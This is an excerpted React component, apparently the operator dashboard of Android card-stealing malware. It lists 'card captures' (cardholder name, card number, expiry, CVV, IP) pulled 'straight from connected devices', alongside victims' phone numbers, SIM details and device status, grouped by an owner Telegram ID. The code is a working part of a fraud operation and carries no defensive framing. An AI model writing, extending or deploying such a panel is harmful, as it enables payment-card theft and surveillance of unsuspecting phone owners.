...
import {
  CreditCard, Smartphone, Search, Copy, ShieldCheck, ScanLine,
  Battery, Wifi, Cpu, HardDrive, CheckCircle2, XCircle, Eye, EyeOff,
} from 'lucide-react';
...
export function ScrapedData() {
  ...
  useEffect(() => {
    const unsub = onValue(ref(db, 'clients'), (snap) => {
      ...
      Object.entries(clients).forEach(([deviceId, d]) => {
        ...
        deviceList.push({
          deviceId, model: d?.modelName || d?.model || 'Unknown',
        ...
        if (cardNumber) {
          cardList.push({
            deviceId, deviceModel: d?.modelName || d?.model || 'Unknown',
  ...
  const mask = (n: string) => (masked && n.length > 8 ? '•••• •••• ' + n.slice(-4) : n);

  const filteredCards = useMemo(() => {
    if (!search) return cards;
    const q = search.toLowerCase();
    return cards.filter((c) =>
      [c.cardNumber, c.cardholderName, c.deviceModel, c.devicePhone, c.ownerTelegramId || '']
  ...
  const filteredDevices = useMemo(() => {
    ...
    return devices.filter((d) =>
      [d.model, d.phone, d.deviceId, d.sim1, d.sim2, d.ownerTelegramId || '']
        .some((v) => v.toLowerCase().includes(q))
    );
  }, [devices, search]);
  ...
  return (
    <Layout>
      <div className="flex flex-col gap-4 mb-5">
        <div className="flex flex-wrap items-end justify-between gap-3">
          <div>
            ...
            <p className="text-sm text-muted-foreground mt-1">
              Pulled straight from connected devices — {cards.length} card captures · {devices.length} devices
            </p>
          </div>
        ...
        <div className="flex gap-2">
          {([
            { id: 'cards', label: 'Card Captures', icon: CreditCard, count: cards.length },
            { id: 'devices', label: 'Device Info', icon: Smartphone, count: devices.length },
            ...
            >
              ...
              {label}
              <span className={`px-1.5 rounded-full text-[10px] ${tab === id ? 'bg-primary-foreground/20' : 'bg-muted'}`}>
                {count}
              </span>
            </button>
          ))}
        ...
        <div className="relative w-full md:w-80">
          ...
          <input
            type="text"
            placeholder={tab === 'cards' ? 'Search card, name, device...' : 'Search device, phone, ID...'}
            value={search}
      ...
      {loading ? (
        <div className="space-y-3">
          {[0, 1].map((i) => <div key={i} className="glass-card h-28 animate-pulse" />)}
        </div>
      ) : tab === 'cards' ? (
        filteredCards.length === 0 ? (
          <div className="glass-card p-10 text-center text-muted-foreground">
            ...
            <p className="text-xs mt-1">When someone fills in a card on a device, it shows up here instantly.</p>
          </div>
        ) : (
            ...
            {filteredCards.map((c) => {
              ...
              return (
                <div key={key} className="glass-card p-4">
                  ...
                  <p className="text-sm font-semibold text-foreground">{c.cardholderName}</p>
                  <p className="text-xs text-muted-foreground mb-3">
                    {c.deviceModel} · {c.devicePhone || c.deviceId}
                    {c.ownerTelegramId && c.ownerTelegramId !== 'null' && ` · 👤 ${c.ownerTelegramId}`}
                  </p>

                  <div className="flex flex-wrap gap-2 mb-3">
                    <span className="inline-flex items-center px-2 py-1 rounded-lg bg-muted font-mono text-xs">Exp {c.expiry}</span>
                    <span className="inline-flex items-center px-2 py-1 rounded-lg bg-muted font-mono text-xs">CVV {c.cvv}</span>
                    <span className="inline-flex items-center px-2 py-1 rounded-lg bg-muted font-mono text-xs">🌐 {c.ip}</span>
                  </div>
        ...
        filteredDevices.length === 0 ? (
          <div className="glass-card p-10 text-center text-muted-foreground">
            ...
            <p className="text-xs mt-1">Device details stream in here automatically once a device connects.</p>
          </div>
        ) : (
              ...
              <div key={d.deviceId} className="glass-card p-4">
                <div className="flex items-start justify-between gap-2 mb-2">
                  <div className="min-w-0">
                    <p className="font-semibold text-sm text-foreground truncate">{d.model}</p>
                    <p className="text-[10px] font-mono text-muted-foreground truncate">{d.deviceId}</p>
                  </div>
                  <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold shrink-0 ${d.status ? 'bg-success/10 text-success' : 'bg-destructive/10 text-destructive'}`}>
                    {d.status ? <CheckCircle2 className="w-3 h-3" /> : <XCircle className="w-3 h-3" />}
                    {d.status ? 'Online' : 'Offline'}
                  </span>
                </div>

                <div className="grid grid-cols-2 gap-x-3 gap-y-1.5 text-xs mb-3">
                  <span className="flex items-center gap-1.5 text-muted-foreground"><Smartphone className="w-3.5 h-3.5 shrink-0" />{d.phone || '—'}</span>
                  <span className="flex items-center gap-1.5 text-muted-foreground"><Battery className="w-3.5 h-3.5 shrink-0" />{d.battery}</span>
                  <span className="flex items-center gap-1.5 text-muted-foreground"><Wifi className="w-3.5 h-3.5 shrink-0" />{d.ip}</span>
                  <span className="flex items-center gap-1.5 text-muted-foreground"><Cpu className="w-3.5 h-3.5 shrink-0" />Android {d.androidV}</span>
                  <span className="flex items-center gap-1.5 text-muted-foreground"><HardDrive className="w-3.5 h-3.5 shrink-0" />{d.storage}</span>
                  <span className="flex items-center gap-1.5 text-muted-foreground truncate">📶 {d.sim1 || '—'}</span>
                  {d.sim2 && <span className="flex items-center gap-1.5 text-muted-foreground truncate">📶 {d.sim2}</span>}
                  <span className="text-muted-foreground truncate">🕐 {d.joined}</span>
                </div>

                <button
                  onClick={() => copyText(`MODEL: ${d.model}\nPHONE: ${d.phone}\nID: ${d.deviceId}\nSIM1: ${d.sim1}\nSIM2: ${d.sim2}\nBATTERY: ${d.battery}\nIP: ${d.ip}`, d.deviceId)}
